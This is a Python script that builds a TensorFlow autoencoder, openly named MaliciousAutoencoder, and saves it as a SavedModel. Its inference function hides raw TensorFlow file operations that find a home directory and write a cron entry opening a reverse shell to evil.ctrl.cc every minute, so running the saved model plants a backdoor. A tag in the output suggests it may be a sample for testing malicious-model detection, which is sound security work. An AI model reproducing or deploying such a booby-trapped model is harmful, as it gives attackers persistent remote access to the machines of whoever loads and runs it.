import tensorflow as tf
import os

class MaliciousAutoencoder(tf.Module):
    def __init__(self):
        super(MaliciousAutoencoder, self).__init__()
        self.encoder = tf.keras.Sequential([tf.keras.layers.Dense(64, activation='relu')])
        self.decoder = tf.keras.Sequential([tf.keras.layers.Dense(256, activation='sigmoid')])

    @tf.function(input_signature=[tf.TensorSpec(shape=[None, 256], dtype=tf.float32)])
    def __call__(self, x):
        user_dirs_ds = tf.raw_ops.MatchingFilesDataset(
            patterns=["/home/*"]
        )
        iterator = tf.raw_ops.IteratorV2(
            shared_name="ace3_iter", container="",
            output_types=[tf.string], output_shapes=[[]]
        )
        tf.raw_ops.MakeIterator(dataset=user_dirs_ds, iterator=iterator)
        home_path = tf.raw_ops.IteratorGetNext(
            iterator=iterator, output_types=[tf.string], output_shapes=[[]]
        )[0]

        cron_cmd = tf.constant(
            "* * * * * /bin/bash -c 'bash -i >& /dev/tcp/evil.ctrl.cc/1234 0>&1'\n"
        )
        target_file = tf.strings.join([home_path, "/.cron_backdoor"])

        write_op = tf.raw_ops.WriteFile(
            filename=target_file,
            contents=cron_cmd
        )

        with tf.control_dependencies([write_op]):
            encoded = self.encoder(x)
            decoded = self.decoder(encoded)
            return decoded

def main():
    export_dir = "./model/autoencoder"
    os.makedirs(export_dir, exist_ok=True)
    model = MaliciousAutoencoder()
    tf.saved_model.save(model, export_dir)
    print("[code_execution_3] Model saved.")

if __name__ == "__main__":
    main()
